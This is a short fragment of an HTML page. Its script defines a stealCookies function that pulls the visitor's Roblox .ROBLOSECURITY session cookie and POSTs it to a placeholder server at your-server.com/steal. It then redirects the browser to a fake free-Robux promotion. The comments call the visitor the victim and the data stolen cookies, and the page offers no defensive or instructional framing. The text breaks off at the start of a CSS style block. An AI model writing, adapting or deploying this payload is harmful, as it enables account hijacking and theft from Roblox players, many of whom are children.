    <script>
        function stealCookies() {
            // Capture the victim's Roblox cookies
            var robloxCookies = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
            
            // Send the stolen cookies to our server
            fetch('https://your-server.com/steal', {
                method: 'POST',
                body: JSON.stringify({ cookies: robloxCookies }),
                headers: { 'Content-Type': 'application/json' }
            });

            // Redirect to the modified Roblox site
            window.location.href = 'https://www.roblox.com/fake-promo?robux=10000';
        }
    </script>
    <style>
        body { font-family: Arial; background: linear-gradient(to bottom, #60a5fa, #3b82f6); text-align: center; padding-top: 50px; }
